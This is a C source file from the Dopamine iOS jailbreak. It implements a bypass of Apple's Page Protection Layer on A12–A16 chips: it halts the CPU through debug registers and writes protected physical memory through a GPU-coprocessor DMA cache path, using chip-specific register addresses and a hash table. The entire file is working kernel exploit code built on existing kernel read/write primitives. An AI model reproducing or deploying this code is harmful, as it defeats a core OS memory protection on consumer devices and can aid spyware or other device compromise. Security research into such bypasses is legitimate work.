//
//  dmaFail.c
//  Dopamine
//
//  Created by Lars Fröder on 13.01.24.
//

#include <stdio.h>
#include <libjailbreak/primitives.h>
#include <libjailbreak/translation.h>
#include <libjailbreak/info.h>
#include <libjailbreak/kernel.h>
#include <libjailbreak/util.h>
#include <dlfcn.h>
#include <mach-o/dyld.h>
#include <sys/sysctl.h>
#include <string.h>
#include <unistd.h>
#include <assert.h>

#define DBGWRAP_DBGHALT          (1ULL << 31)
#define DBGWRAP_DBGACK           (1ULL << 28)

struct shit_map {
    uint64_t pa;
    uint8_t *ua;
};
#define CACHED_MAP_LEN 20
struct shit_map gCachedMap[CACHED_MAP_LEN];
bool gIsA15A16 = false;
uint64_t gGFXBase = 0;
uint32_t gGFXCommand = 0;
uint64_t gDMAIndex = 0;
uint64_t gDMAMask = 0;


static int physwritebuf_ppl(uint64_t physaddr, const void* input, size_t size);

// Add a mapping in the kernel address space
void addMapping(uint64_t addr)
{
    for (int i = 0; i < CACHED_MAP_LEN; i++) {
        uint64_t page = addr & ~PAGE_MASK;
        if (gCachedMap[i].pa == page) {
            break;
        }
        else if (gCachedMap[i].pa == 0) {
            gCachedMap[i].pa = page;
            if (gPrimitives.kwritebuf || gPrimitives.physwritebuf != physwritebuf_ppl) {
                kmap(gCachedMap[i].pa, 0x4000, (void **)&gCachedMap[i].ua);
                printf("Mapped %llx to %p\n", gCachedMap[i].pa, gCachedMap[i].ua);
            }
            else {
                printf("Prevented mapping because we can't do it\n");
            }
            break;
        }
    }
}

// Remove mappings in the kernel address space
void clearMappings(void)
{
    for (int i = 0; i < CACHED_MAP_LEN; i++) {
        if (gCachedMap[i].pa) {
            vm_deallocate(mach_task_self_, (vm_address_t)gCachedMap[i].ua, 0x4000);
            gCachedMap[i].pa = 0;
            gCachedMap[i].ua = NULL;
        }
    }
}

// Write to a mapped address
void physwrite64_mapped(uint64_t addr, uint64_t val)
{
    addMapping(addr);

    for (int i = 0; i < CACHED_MAP_LEN; i++) {
        uint64_t page = addr & ~PAGE_MASK;
        uint64_t off = addr & PAGE_MASK;
        if (gCachedMap[i].pa == page) {
            *(uint64_t *)(gCachedMap[i].ua + off) = val;
        }
    }
}

// Read from a mapped address
uint64_t physread64_mapped(uint64_t addr)
{
    addMapping(addr);

    for (int i = 0; i < CACHED_MAP_LEN; i++) {
        uint64_t page = addr & ~PAGE_MASK;
        uint64_t off = addr & PAGE_MASK;
        if (gCachedMap[i].pa == page) {
            return *(uint64_t *)(gCachedMap[i].ua + off);
        }
    }
    return 0;
}

void physwrite32_mapped(uint64_t addr, uint32_t val)
{
    addMapping(addr);

    for (int i = 0; i < CACHED_MAP_LEN; i++) {
        uint64_t page = addr & ~PAGE_MASK;
        uint64_t off = addr & PAGE_MASK;
        if (gCachedMap[i].pa == page) {
            *(uint32_t *)(gCachedMap[i].ua + off) = val;
            break;
        }
    }
}

uint32_t physread32_mapped(uint64_t addr)
{
    addMapping(addr);

    for (int i = 0; i < CACHED_MAP_LEN; i++) {
        uint64_t page = addr & ~PAGE_MASK;
        uint64_t off = addr & PAGE_MASK;
        if (gCachedMap[i].pa == page) {
            return *(uint32_t *)(gCachedMap[i].ua + off);
        }
    }
    return 0;
}

// Halt CPU
void ml_dbgwrap_halt_cpu(void)
{
    if ((physread64_mapped(0x206040000) & DBGWRAP_DBGHALT) != 0) {
        return;
    }
    
    physwrite64_mapped(0x206040000, physread64_mapped(0x206040000) | DBGWRAP_DBGHALT);
    
    while ((physread64_mapped(0x206040000) & DBGWRAP_DBGACK) == 0) { }
}

// Unhalt CPI
void ml_dbgwrap_unhalt_cpu(void)
{
    physwrite64_mapped(0x206040000, ((physread64_mapped(0x206040000) & 0xFFFFFFFF2FFFFFFF) | 0x40000000));
    if ((physread64_mapped(0x206040000) & DBGWRAP_DBGHALT) != 0) {
        return;
    }
    while ((physread64_mapped(0x206040000) & DBGWRAP_DBGACK) != 0) { }
}

// Power on the GFX
void gfx_power_init(void)
{
    if ((~physread32_mapped(gGFXBase) & 0xF) != 0) {
        physwrite32_mapped(gGFXBase, gGFXCommand);
        while(true) {
            if ((~physread32_mapped(gGFXBase) & 0xF) == 0) {
                break;
            }
        }
    }
}

void dma_ctrl_1(void)
{
    uint64_t ctrl = 0x206140108;
    uint64_t value = physread64_mapped(ctrl);
    physwrite64_mapped(ctrl, value | 0x8000000000000001);
    //sleep(1);

    while ((~physread64_mapped(ctrl) & 0x8000000000000001) != 0) { /*sleep(1);*/ }
}

void dma_ctrl_2(bool flag)
{
    uint64_t ctrl = 0x206140008;
    uint64_t value = physread64_mapped(ctrl);

    if (flag) {
        if ((value & 0x1000000000000000) == 0) {
            value |= 0x1000000000000000;
            physwrite64_mapped(ctrl, value);
        }
    }
    else {
        if ((value & 0x1000000000000000) == 0) {
            value &= ~0x1000000000000000;
            physwrite64_mapped(ctrl, value);
        }
    }
}

void dma_ctrl_3(uint64_t value)
{
    uint64_t ctrl = 0x206140108;
    value |= 0x8000000000000000;

    physwrite64_mapped(ctrl, physread64_mapped(ctrl) & value);

    while ((physread64_mapped(ctrl) & 0x8000000000000001) != 0) { /*sleep(1);*/ }
}

void dma_init(uint64_t orig)
{
    dma_ctrl_1();
    dma_ctrl_2(false);
    dma_ctrl_3(orig);
}

void dma_done(uint64_t orig)
{
    dma_ctrl_1();
    dma_ctrl_2(true);
    dma_ctrl_3(orig);
}

uint64_t sbox[] = {
    0x007, 0x00B, 0x00D, 0x013, 0x00E, 0x015, 0x01F, 0x016,
    0x019, 0x023, 0x02F, 0x037, 0x04F, 0x01A, 0x025, 0x043,
    0x03B, 0x057, 0x08F, 0x01C, 0x026, 0x029, 0x03D, 0x045,
    0x05B, 0x083, 0x097, 0x03E, 0x05D, 0x09B, 0x067, 0x117,
    0x02A, 0x031, 0x046, 0x049, 0x085, 0x103, 0x05E, 0x09D,
    0x06B, 0x0A7, 0x11B, 0x217, 0x09E, 0x06D, 0x0AB, 0x0C7,
    0x127, 0x02C, 0x032, 0x04A, 0x051, 0x086, 0x089, 0x105,
    0x203, 0x06E, 0x0AD, 0x12B, 0x147, 0x227, 0x034, 0x04C,
    0x052, 0x076, 0x08A, 0x091, 0x0AE, 0x106, 0x109, 0x0D3,
    0x12D, 0x205, 0x22B, 0x247, 0x07A, 0x0D5, 0x153, 0x22D,
    0x038, 0x054, 0x08C, 0x092, 0x061, 0x10A, 0x111, 0x206,
    0x209, 0x07C, 0x0BA, 0x0D6, 0x155, 0x193, 0x253, 0x28B,
    0x307, 0x0BC, 0x0DA, 0x156, 0x255, 0x293, 0x30B, 0x058,
    0x094, 0x062, 0x10C, 0x112, 0x0A1, 0x20A, 0x211, 0x0DC,
    0x196, 0x199, 0x256, 0x165, 0x259, 0x263, 0x30D, 0x313,
    0x098, 0x064, 0x114, 0x0A2, 0x15C, 0x0EA, 0x20C, 0x0C1,
    0x121, 0x212, 0x166, 0x19A, 0x299, 0x265, 0x2A3, 0x315,
    0x0EC, 0x1A6, 0x29A, 0x266, 0x1A9, 0x269, 0x319, 0x2C3,
    0x323, 0x068, 0x0A4, 0x118, 0x0C2, 0x122, 0x214, 0x141,
    0x221, 0x0F4, 0x16C, 0x1AA, 0x2A9, 0x325, 0x343, 0x0F8,
    0x174, 0x1AC, 0x2AA, 0x326, 0x329, 0x345, 0x383, 0x070,
    0x0A8, 0x0C4, 0x124, 0x218, 0x142, 0x222, 0x181, 0x241,
    0x178, 0x2AC, 0x32A, 0x2D1, 0x0B0, 0x0C8, 0x128, 0x144,
    0x1B8, 0x224, 0x1D4, 0x182, 0x242, 0x2D2, 0x32C, 0x281,
    0x351, 0x389, 0x1D8, 0x2D4, 0x352, 0x38A, 0x391, 0x0D0,
    0x130, 0x148, 0x228, 0x184, 0x244, 0x282, 0x301, 0x1E4,
    0x2D8, 0x354, 0x38C, 0x392, 0x1E8, 0x2E4, 0x358, 0x394,
    0x362, 0x3A1, 0x150, 0x230, 0x188, 0x248, 0x284, 0x302,
    0x1F0, 0x2E8, 0x364, 0x398, 0x3A2, 0x0E0, 0x190, 0x250,
    0x2F0, 0x288, 0x368, 0x304, 0x3A4, 0x370, 0x3A8, 0x3C4,
    0x160, 0x290, 0x308, 0x3B0, 0x3C8, 0x3D0, 0x1A0, 0x260,
    0x310, 0x1C0, 0x2A0, 0x3E0, 0x2C0, 0x320, 0x340, 0x380
};

uint64_t calculate_hash(uint64_t buffer)
{
    uint64_t acc = 0;
    for (uint32_t i = 0; i < 8; i++) {
        uint32_t pos = i * 4;
        uint32_t value = physread32(buffer + pos);
        for (int j = 0; j < 32; j++) {
            if (((value >> j) & 1) != 0) {
                acc ^= sbox[32 * i + j];
            }
        }
    }
    return acc;
}


void dma_writephys512(uint64_t targetPA, uint64_t *value)
{
    uint64_t tte = kread64(pmap_self() + koffsetof(pmap, tte));
    uint64_t valuePA = vtophys(tte, (uint64_t)value);
    //assert(valuePA != 0);

    cpu_subtype_t cpuFamily = 0;
    size_t cpuFamilySize = sizeof(cpuFamily);
    sysctlbyname("hw.cpufamily", &cpuFamily, &cpuFamilySize, NULL, 0);

    uint64_t orig = physread64_mapped(0x206140108);
    dma_init(orig);

    uint64_t hash1 = calculate_hash(valuePA);
    uint64_t hash2 = calculate_hash(valuePA + 0x20);

    physwrite64_mapped(0x206150040, 0x2000000 | (targetPA & 0x3FC0));

    uint32_t pos = 0;
    while (pos < 0x40) {
        physwrite64_mapped(0x206150048, physread64(valuePA + pos));
        pos += 8;
    }

    uint64_t targetPAUpper = ((((targetPA >> 14) & gDMAMask) << 18) & 0x3FFFFFFFFFFFF);
    physwrite64_mapped(0x206150048, targetPAUpper | (hash1 << gDMAIndex) | (hash2 << 50) | 0x1f);

    dma_done(orig);
}

void dma_writephysbuf(uint64_t pa, const void *input, size_t size)
{
    size_t sizeLeft = size;
    uint8_t *inputData = (uint8_t *)input;

    while (sizeLeft > 0) {
        uint64_t curCacheLinePA = pa & ~0x3f;
        uint64_t curCacheLineOff = pa & 0x3f;
        uint64_t writeSize = min(sizeLeft, 0x40 - curCacheLineOff);
        
        uint8_t curCacheLine[0x40];
        uint64_t curCacheLineVirt = phystokv(curCacheLinePA);
        kreadbuf(curCacheLineVirt, curCacheLine, sizeof(curCacheLine));
        
        memcpy(&curCacheLine[curCacheLineOff], &inputData[size-sizeLeft], writeSize);
        
        dma_writephys512(curCacheLinePA, (uint64_t *)curCacheLine);

        pa += writeSize;
        sizeLeft -= writeSize;
    }
}

void dma_writephys64(uint64_t pa, uint64_t val)
{
    dma_writephysbuf(pa, &val, sizeof(val));
}

void dma_writephys32(uint64_t pa, uint32_t val)
{
    dma_writephysbuf(pa, &val, sizeof(val));
}

void dma_writephys16(uint64_t pa, uint16_t val)
{
    dma_writephysbuf(pa, &val, sizeof(val));
}

void dma_writephys8(uint64_t pa, uint8_t val)
{
    dma_writephysbuf(pa, &val, sizeof(val));
}

void dma_perform(void (^block)(void))
{
    gfx_power_init();

    uint64_t backup = 0;
    if (gIsA15A16) {
        backup = physread64_mapped(0x206150020);
        physwrite64_mapped(0x206150020, 1);
    }
    
    ml_dbgwrap_halt_cpu();
    
    block();
    
    ml_dbgwrap_unhalt_cpu();
    
    if (gIsA15A16) {
        physwrite64_mapped(0x206150020, backup);
    }
}

static int physwritebuf_ppl(uint64_t physaddr, const void* input, size_t size)
{
    assert(physaddr >= kconstant(physBase));
    assert(physaddr < kconstant(physBase) + kconstant(physSize));

    while (true) {
        dma_perform(^{
            dma_writephysbuf(physaddr, input, size);
        });
        
        // It seems sometimes the writes can be a little delayed because we are writing to a cache after all
        // In this case repeat the writes until the bytes we read back match what we expect
        uint8_t checkBuf[size];
        physreadbuf(physaddr, checkBuf, size);
        if (!memcmp(input, checkBuf, size)) {
            break;
        }
    }
    return 0;
}

int PPLRW_init(void)
{
    cpu_subtype_t cpuFamily = 0;
    size_t cpuFamilySize = sizeof(cpuFamily);
    sysctlbyname("hw.cpufamily", &cpuFamily, &cpuFamilySize, NULL, 0);

    switch (cpuFamily) {
        case 0x8765EDEA: // A16
            gGFXBase = 0x23B700408;
            gGFXCommand = 0x1F0023FF;
            gDMAIndex = 8;
            gDMAMask = 0x7FFFFFF;
            gIsA15A16 = true;
            break;
        case 0xDA33D83D: // A15
            gGFXBase = 0x23B7003C8;
            gGFXCommand = 0x1F0023FF;
            gDMAIndex = 8;
            gDMAMask = 0x7FFFFFF;
            gIsA15A16 = true;
            break;
        case 0x1B588BB3: // A14
            gGFXBase = 0x23B7003D0;
            gGFXCommand = 0x1F0023FF;
            gDMAIndex = 0x28;
            gDMAMask = 0x3FFFFF;
            break;
        case 0x462504D2: // A13
            gGFXBase = 0x23B080390;
            gGFXCommand = 0x1F0003FF;
            gDMAIndex = 0x28;
            gDMAMask = 0x3FFFFF;
            break;
        case 0x07D34B9F: // A12
            gGFXBase = 0x23B080388;
            gGFXCommand = 0x1F0003FF;
            gDMAIndex = 0x28;
            gDMAMask = 0x3FFFFF;
            break;
        default:
            return -1;
    }
    
    // Pre map all pages we need
    addMapping(gGFXBase);
    addMapping(0x206040000);
    addMapping(0x206140000);
    addMapping(0x206150000);
    
    gPrimitives.physwritebuf = physwritebuf_ppl;
    return 0;
}

int PPLRW_deinit(void)
{
    clearMappings();
    if (gPrimitives.physwritebuf == physwritebuf_ppl) {
        gPrimitives.physwritebuf = NULL;
    }
    return 0;
}
